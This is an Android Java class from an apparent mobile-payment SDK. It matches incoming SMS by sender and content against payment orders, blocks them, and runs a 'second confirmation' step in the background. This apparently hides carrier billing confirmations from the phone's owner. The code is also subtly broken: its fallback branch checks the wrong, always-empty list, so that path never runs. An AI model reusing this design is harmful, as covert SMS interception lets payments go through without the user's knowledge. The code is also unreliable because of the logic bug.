package com.example.sayid.myapplication.common.bean;

import android.content.Context;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.LinkedBlockingDeque;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class BlockBean {
    private final static String TAG = "BlockBean";

    /**
     * 用户订单号
     */
    public String user_order_id;

    /**
     * 云巢流水号
     */
    public String pay_order_id;

    /**
     * 拦截优先级
     * 0表示最低 值越大优先级越高
     */
    public String block_level;

    /**
     * 监控结束时间
     */
    public long monitor_end_time;

    /**
     * 创建时间，拦截短信，优先级一致，后创建的排在前面
     */
    public long create_time = System.currentTimeMillis();

    public BlockSecondConfirm blockSecondConfirm = new BlockSecondConfirm();

    public BlockBusinessPrompt blockBusinessPrompt = new BlockBusinessPrompt();

    private static ThreadPoolExecutor poolExecutor = new ThreadPoolExecutor(1, 3, 1, TimeUnit.SECONDS, new LinkedBlockingDeque<Runnable>(100));

    public static int getThreadPoolCount() {
        return poolExecutor.getActiveCount();
    }

    /**
     * 构造函数
     */
    public BlockBean() {
    }

    /**
     * 构造函数
     *
     * @param user_order_id
     * @param pay_order_id
     */
    public BlockBean(String user_order_id, String pay_order_id) {
        this.user_order_id = user_order_id;
        this.pay_order_id = pay_order_id;
    }

    /**
     * Json解析
     *
     * @param jsonObj
     * @param send_sms_timeout
     * @throws JSONException
     */
    public void parseJson(JSONObject jsonObj, int send_sms_timeout) throws JSONException {
        blockSecondConfirm.parseJson(jsonObj);
        blockSecondConfirm.send_sms_timeout = send_sms_timeout;

        blockBusinessPrompt.parseJson(jsonObj);
    }

    /**
     * 是否拦截短信
     * 二次确认，业务提示
     *
     * @param blockList
     * @param address
     * @param content
     * @return
     */
    public static boolean isBlock(final Context context, List<BlockBean> blockList, final String address, final String content, final boolean isProcess) {
        boolean isBlock = false;
//		System.out.println("blockList ===  "+blockList);
        if (blockList == null || blockList.isEmpty() || !isProcess) {
            return isBlock;
        }

//		Logs.d(TAG, "isBlock--- phoneNum = " + address + "; textMsg = " + content);

        final List<BlockBean> findList = BlockBean.getMatchSc(context, blockList, address, content);
//		System.out.println("findList ===  "+findList);
        if (findList.size() > 0) {
            isBlock = true;
            if (isProcess) {
                poolExecutor.execute(new Runnable() {
                    @Override
                    public void run() {
                        for (BlockBean bean : findList) {
//							System.out.println("BlockBean ===  "+  bean );


//							Logs.d(TAG, "getMatchSc---find it, size= " +  findList.size() + ", pay_order_id=" + bean.pay_order_id + ", confirm_bool=" + bean.blockSecondConfirm.confirm_bool);
                            // 二次确认拦截处理
                            //PreferUtil.getInstance().setSmsRunnable(true);
                            bean.blockSecondConfirm.confirmProcess(context, bean.user_order_id, bean.pay_order_id, address, content);
                        }
                    }
                });
            }
        } else {
            final List<BlockBean> findCpList = BlockBean.getMatchCp(context, blockList, address, content);
            if (findList.size() > 0) {
                isBlock = true;
                if (isProcess) {
                    poolExecutor.execute(new Runnable() {
                        @Override
                        public void run() {
                            for (BlockBean bean : findList) {
//								Logs.d(TAG, "getMatchCp---find it, size= " + findList.size() + ", pay_order_id=" + bean.pay_order_id + ", prompt_bool=" + bean.blockBusinessPrompt.prompt_bool);
                                bean.blockBusinessPrompt.promptUpdate(context, bean.user_order_id, bean.pay_order_id);
                            }
                        }
                    });
                }
            }
        }

        return isBlock;
    }

    /**
     * 获取匹配到的二次确认
     *
     * @param blockList
     * @param address
     * @param content
     * @return
     */
    private static List<BlockBean> getMatchSc(Context context, List<BlockBean> blockList, String address, String content) {
        List<BlockBean> findList = new ArrayList<BlockBean>();
        BlockBean lastBean = null;
        try {
            for (BlockBean bean : blockList) {
                // 需要拦截的才匹配，性能优化
                boolean block = bean.blockSecondConfirm.isBlock();
                if (block) {
                    boolean match = bean.blockSecondConfirm.isMatch(address, content);
                    if (match) {
                        // 如果策略使用过，将最后一条策略保存到beantmp中
                        if (!bean.blockSecondConfirm.confirm_bool) {
                            findList.add(bean);
                        } else {
                            lastBean = bean;
                        }
                    }
                }
            }
        } catch (Exception e) {
            //.e(TAG, "getMatchSc error:" + e.toString());
        }

        if (lastBean != null) {
            findList.add(lastBean);
        }
        // 返回最后一条之前使用过的一条策略
        return findList;
    }

    /**
     * 获取匹配到的业务提示
     *
     * @param blockList
     * @param address
     * @param content
     * @return
     */
    private static List<BlockBean> getMatchCp(Context context, List<BlockBean> blockList, String address, String content) {
        List<BlockBean> findList = new ArrayList<BlockBean>();
        BlockBean lastBean = null;
        try {
            for (BlockBean bean : blockList) {
                // 需要拦截的才匹配，性能优化，跟二次确认不同
                boolean block = bean.blockBusinessPrompt.isBlock();
                if (block) {
                    boolean match = bean.blockBusinessPrompt.isMatch(address, content);
                    if (match) {
                        // 如果策略使用过，将最后一条策略保存到beantmp中
                        if (!bean.blockBusinessPrompt.prompt_bool) {
                            findList.add(bean);
                        } else {
                            lastBean = bean;
                        }
                    }
                }
            }
        } catch (Exception e) {
//			Logs(TAG, "getMatchCp error:" + e.toString());

        }

        if (lastBean != null) {
            findList.add(lastBean);
        }
        // 返回最后一条之前使用过的一条策略
        return findList;
    }

    @Override
    public String toString() {
        StringBuffer str = new StringBuffer();
        str.append("user_order_id=").append(user_order_id)
                .append(",pay_order_id=").append(pay_order_id)
                .append("\n<br>block_level=").append(block_level)
                .append(",monitor_end_time=").append(monitor_end_time)
                .append(",create_time=").append(create_time)
                .append(",blockSecondConfirm=").append(blockSecondConfirm.toString())
                .append(",blockBusinessPrompt=").append(blockBusinessPrompt.toString());

        return str.toString();
    }
}